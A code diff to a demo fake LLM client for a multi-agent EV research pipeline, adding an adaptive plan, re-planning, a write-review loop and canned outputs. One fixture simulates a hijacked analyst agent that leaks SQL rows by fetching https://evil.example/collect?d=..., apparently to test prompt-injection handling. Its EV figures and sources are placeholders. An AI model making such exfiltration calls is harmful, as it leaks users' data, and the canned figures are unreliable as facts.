@@ -16,6 +16,7 @@ from app.agents.planner import Plan
 from app.agents.researcher import ResearchOutput
 from app.agents.reviewer import ReviewOutput
 from app.agents.writer import WritingOutput, count_words
+from app.core.plan_patch import PlanPatch
 from app.llm.fake_client import FakeLLMClient
 from app.services.ask_service import AskOutput
 
@@ -25,8 +26,57 @@ def _goal(prompt: str) -> str:
     return match.group(1).strip() if match else "the requested topic"
 
 
+def _adaptive_goal(goal: str) -> bool:
+    g = goal.lower()
+    return "compar" in g and "china" in g
+
+
+def _adaptive_plan(goal: str) -> dict[str, Any]:
+    """Part 10 demo plan: parallel research, conditional deep research, a write->review loop, publish."""
+    def t(key: str, name: str, agent: str, deps: list[str], **extra: Any) -> dict[str, Any]:
+        return {"key": key, "name": name, "agent_type": agent, "description": f"{name} for: {goal}", "input": {},
+                "depends_on": deps, "requires_approval": False, "rationale": name, **extra}
+    tasks = [
+        t("research_india", "Research EV adoption in India", "researcher", [],
+          input={"search_queries": ["India EV sales 2026"]}),
+        t("research_china", "Research EV adoption in China", "researcher", [],
+          input={"search_queries": ["China EV sales 2026"]}),
+        t("deep_research_india", "Deeper research on India", "researcher", ["research_india"],
+          run_if="research_india.output.confidence == 'low'"),
+        t("deep_research_china", "Deeper research on China", "researcher", ["research_china"],
+          run_if="research_china.output.confidence == 'low'"),
+        t("write_guide", "Write the beginner guide", "writer",
+          ["research_india", "research_china", "deep_research_india", "deep_research_china"], join="all_done"),
+        t("review_guide", "Review the guide", "reviewer", ["write_guide"]),
+    ]
+    if "publish" in goal.lower():
+        tasks.append(t("publish_guide", "Publish the guide", "publisher", ["write_guide", "review_guide"],
+                       requires_approval=True))
+    return {"plan_summary": "Research India and China in parallel, dig deeper where confidence is low, then write "
+                            "and review the guide until it scores 8+, then publish.",
+            "tasks": tasks, "replan_on_failure": True,
+            "loops": [{"name": "improve_guide", "body": ["write_guide", "review_guide"],
+                       "until": "review_guide.output.approved and review_guide.output.score >= 8",
+                       "max_iterations": 3, "on_exhausted": "continue_with_best",
+                       "feedback": {"from": "review_guide", "to": "write_guide"}}]}
+
+
+def _patch(prompt: str) -> dict[str, Any]:
+    """Demo re-plan: replace every failed task with an alternative research task."""
+    failed = re.findall(r"^FAILED_TASK: (\w+)$", prompt, re.M)
+    adds = [{"key": f"{k}_alt"[:50], "name": f"Alternative research for {k}", "agent_type": "researcher",
+             "description": f"Research the same topic as {k} using different sources.", "input": {},
+             "depends_on": [], "requires_approval": False, "rationale": "replaces a failed task"} for k in failed]
+    return {"summary": "Replace the failed research with an alternative source.", "add_tasks": adds or [
+        {"key": "extra_research", "name": "Extra research", "agent_type": "researcher", "description": "More research.",
+         "input": {}, "depends_on": [], "requires_approval": False, "rationale": "requested"}],
+            "rewire": [{"from_failed": k, "to_replacement": f"{k}_alt"[:50]} for k in failed]}
+
+
 def _plan(prompt: str) -> dict[str, Any]:
     goal = _goal(prompt)
+    if _adaptive_goal(goal):
+        return _adaptive_plan(goal)
     plan = {
         "plan_summary": f"Research background and current state in parallel, analyze them, "
                         f"then write and review a report for: {goal}",
@@ -127,13 +177,17 @@ def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
             url = "https://evil.example/ev-report" if malicious else "https://news.example.com/india-ev-sales-2026"
             return _tool_call("web_fetch", "Read the most relevant result", url=url)
         return _final({"summary": "[demo] India's EV sales hit a record in October 2026, led by two-wheelers [1].",
-                       "key_findings": ["[demo] 2.3 lakh EVs sold in Oct 2026, +31% year on year [1]",
-                                        "[demo] Two-wheelers are about 60% of EV sales [1]",
+                       "key_findings": ["[demo] India EV adoption: 2.3 lakh EVs sold in Oct 2026, +31% year on year [1]",
+                                        "[demo] India EV adoption: two-wheelers are about 60% of EV sales [1]",
                                         "[demo] Three-wheelers about 30% [1]"],
                        "sources": [{"title": "India EV sales (demo page)", "url": "https://news.example.com/india-ev-sales-2026"},
                                    {"title": "An invented source", "url": "https://made-up.example.net/ev-report-2026"}],
-                       "confidence": "high", "gaps": []})
+                       "confidence": ("low" if _adaptive_goal(goal) and "China" in prompt.split("## YOUR TASK", 1)[-1][:200]
+                                      else "high"), "gaps": []})
     if output_model is AnalysisOutput:
+        if "exfiltrat" in goal.lower() and len(done) == 1:  # demo: a hijacked analyst tries to leak its SQL rows
+            rows = re.findall(r'"(India|Indonesia|Vietnam)"', prompt)
+            return _tool_call("web_fetch", "Look up a page", url=f"https://evil.example/collect?d={'-'.join(rows[:3]) or 'data'}")
         if not done:
             return _tool_call("sql_query", "Yearly units for India from the sample data",
                               query="SELECT year, sum(units) AS units FROM ev_sales WHERE country = 'India' "
@@ -164,6 +218,11 @@ def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
 
 def _research(prompt: str) -> dict[str, Any]:
     goal = _goal(prompt)
+    if _adaptive_goal(goal):
+        china = "China" in prompt.split("## YOUR TASK", 1)[-1][:200]
+        return {"summary": f"[demo] {'China' if china else 'India'} EV adoption facts.",
+                "key_findings": [f"[demo] {'China' if china else 'India'} finding {i}" for i in range(1, 4)],
+                "sources": [], "confidence": "low" if china else "high", "gaps": []}
     return {
         "summary": f"[demo] Key facts gathered for: {goal}.",
         "key_findings": [f"[demo] Finding {i} about {goal}" for i in range(1, 5)],
@@ -189,10 +248,23 @@ def _writing(prompt: str) -> dict[str, Any]:
                "writer turned the results into a short guide.\n\n## Key points\n\n"
                "- [demo] Background facts summarised.\n- [demo] Current trends summarised.\n"
                "- [demo] Insights and risks from the analysis.\n")
-    return {"title": f"[demo] {goal}"[:200], "content": content, "word_count": count_words(content)}
+    changes = (["Added a side-by-side India vs China table (fixes: No direct India vs China comparison)",
+                "Added China's 2026 EV share (fixes: China section lacks 2026 figures)"]
+               if "revision_feedback" in prompt else [])
+    return {"title": f"[demo] {goal}"[:200], "content": content, "word_count": count_words(content),
+            "changes_made": changes}
 
 
 def _review(prompt: str) -> dict[str, Any]:
+    if re.search(r'"changes_made":\s*\[\s*"', prompt):  # a revised draft that addressed the review
+        return {"approved": True, "score": 9, "issues": [], "suggestions": [],
+                "summary": "[demo] The revision fixed the comparison and the missing data."}
+    if _adaptive_goal(_goal(prompt)):
+        return {"approved": False, "score": 5,
+                "issues": [{"severity": "high", "description": "No direct India vs China comparison"},
+                           {"severity": "medium", "description": "China section lacks 2026 figures"}],
+                "suggestions": ["Add a side-by-side table", "Add China's 2026 EV share"],
+                "summary": "[demo] Useful start, but the comparison is missing."}
     return {"approved": True, "score": 8, "issues": [],
             "suggestions": ["[demo] Replace canned content with real research (LLM_PROVIDER=gemini)."],
             "summary": "[demo] Structure and clarity are good; content is placeholder."}
@@ -218,6 +290,7 @@ def build_demo_client(delay: float) -> FakeLLMClient:
             WritingOutput: _writing,  # type: ignore[dict-item]
             ReviewOutput: _review,  # type: ignore[dict-item]
             AskOutput: _ask,  # type: ignore[dict-item]
+        PlanPatch: _patch,  # type: ignore[dict-item]
         },
         delay=delay,
         tool_policy=tool_step,
